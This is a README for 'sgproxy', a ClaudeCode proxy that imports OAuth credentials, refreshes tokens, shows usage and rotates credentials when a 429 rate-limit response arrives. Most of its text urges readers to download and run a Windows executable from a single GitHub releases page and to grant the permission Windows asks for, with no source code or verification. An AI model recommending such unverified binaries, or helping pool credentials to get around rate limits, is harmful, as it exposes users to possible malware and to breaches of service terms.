# ⚡ sgproxy - Simple ClaudeCode Proxy Control

[![Download sgproxy](https://img.shields.io/badge/Download%20sgproxy-Visit%20Releases-blue)](https://github.com/Esethu1974/sgproxy/releases)

## 🧭 What sgproxy does

sgproxy is a small proxy tool for ClaudeCode and Anthropic access. It helps you import login credentials, keep tokens fresh, view usage, and forward `/v1/*` requests with only headers changed.

It is built for users who want a focused setup for ClaudeCode only. It does not try to handle many channels or many format types.

## 📥 Download sgproxy

Visit this page to download sgproxy:

https://github.com/Esethu1974/sgproxy/releases

On that page, look for the latest release for Windows. Download the file that matches your system, then open it to start the app or installer.

## 🪟 Windows setup

Use these steps on a Windows PC:

1. Open the release page.
2. Download the Windows file from the latest release.
3. If the file is a ZIP, right-click it and choose Extract All.
4. Open the extracted folder.
5. Double-click the program file to run sgproxy.
6. If Windows asks for permission, choose Yes.
7. Keep the app open while you use ClaudeCode with it.

If you see more than one file, pick the one that looks like the Windows build, such as `.exe` or `.zip`.

## 🔧 First-time use

After you start sgproxy for the first time, set up these items:

1. Open the admin page in your browser.
2. Sign in with the admin token you set during setup.
3. Import your ClaudeCode OAuth credentials.
4. Check that the credential status shows as active.
5. Make sure the proxy address is the one you want ClaudeCode to use.

If you are using the Cloudflare version, the same setup flow applies after deployment. The tool will ask for the required `ADMIN_TOKEN` during setup.

## ✨ Main features

- **ClaudeCode-only proxy** — Built for Anthropic ClaudeCode traffic
- **Header-only forwarding** — Keeps the request body and response body unchanged
- **OAuth import** — Lets you add credentials with OAuth2 + PKCE
- **Auto refresh** — Refreshes tokens before they expire
- **Usage tracking** — Shows 5-hour, 7-day, and Sonnet limits
- **429 fallback** — Switches the next request to a different credential
- **Web admin panel** — Gives you a simple browser-based control screen
- **Public usage page** — Lets others view usage without signing in

## 🖥️ How to use it with ClaudeCode

To use sgproxy with ClaudeCode:

1. Start sgproxy on your Windows PC.
2. Open ClaudeCode.
3. Change the proxy or endpoint settings to point to sgproxy.
4. Use ClaudeCode as usual.
5. Check the admin panel if you want to see usage or credential status.

sgproxy only changes headers and routes the request. It does not rewrite the body of your messages.

## 🔐 Credentials and token handling

sgproxy keeps track of credential state for you.

- Active credentials stay ready for use
- Expired tokens refresh before they stop working
- Failed refresh attempts mark a credential as `dead`
- When a request gets a 429 response, sgproxy does not retry that same request
- It uses another credential for the next request

This helps keep ClaudeCode access steady without extra manual steps.

## 🌍 Languages

The admin panel includes:

- Chinese
- English

You can use either one based on what feels easier.

## 🧰 Basic requirements

For Windows use, you will need:

- Windows 10 or later
- A modern web browser
- Internet access
- A ClaudeCode account or valid Anthropic credentials
- Permission to run downloaded apps on your PC

If you use the Cloudflare deployment path, you will also need a Cloudflare account.

## 🚀 Start in a few steps

1. Visit the release page.
2. Download the Windows file.
3. Open the file and launch sgproxy.
4. Set your admin token.
5. Import your credentials.
6. Point ClaudeCode to the local proxy.
7. Begin using ClaudeCode through sgproxy

## 🧭 Where to find the admin page

After sgproxy starts, open the local web address shown by the app. That page gives you access to:

- Credential import
- Token status
- Usage data
- Language switch
- Public usage view settings

If the app shows a local port, use that address in your browser.

## 🧪 Troubleshooting

If sgproxy does not start:

1. Check that the file finished downloading.
2. Make sure Windows did not block the file.
3. Try running it again as the same user who downloaded it.
4. Confirm that no other app is using the same port.
5. Restart the app after changing settings.

If ClaudeCode does not connect:

1. Check the proxy address in ClaudeCode.
2. Make sure sgproxy is still running.
3. Confirm that your credentials are active.
4. Open the admin page and review token status.
5. Import a fresh credential if the old one is no longer valid.

If the browser page does not open:

1. Copy the local address from the app.
2. Paste it into your browser.
3. Check your firewall rules.
4. Try a different browser

## 📌 Release page link

Download or update sgproxy here:

https://github.com/Esethu1974/sgproxy/releases

## 🧾 What this app is for

sgproxy helps you keep ClaudeCode access in one place. It gives you a browser view for credential control, usage checks, and token refresh. It also keeps proxy behavior simple by forwarding `/v1/*` requests with header changes only